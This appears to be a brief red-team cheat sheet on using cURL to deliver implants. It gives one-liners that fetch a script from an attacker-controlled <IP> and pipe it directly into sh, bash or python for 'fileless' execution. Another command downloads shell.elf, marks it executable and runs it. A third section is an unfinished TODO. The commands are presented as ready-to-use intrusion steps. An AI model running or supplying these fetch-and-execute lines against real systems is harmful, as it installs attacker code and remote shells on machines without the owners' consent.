# cURL

## 01 - Fileless code execution

```
$ curl http[s]://<IP>/implant.sh | sh

$ curl http[s]://<IP>/implant.sh | bash

$ curl http[s]://<IP>/implant.py | python
```

## 02 - Dropping on disk

Download implant and execute it.

```
$ curl -o shell.elf http[s]://<IP>/shell.elf && chmod +x shell.elf && ./shell.elf
```

## 03 - Compiled After Delivery

TODO: Fill this info

```
$ gcc
```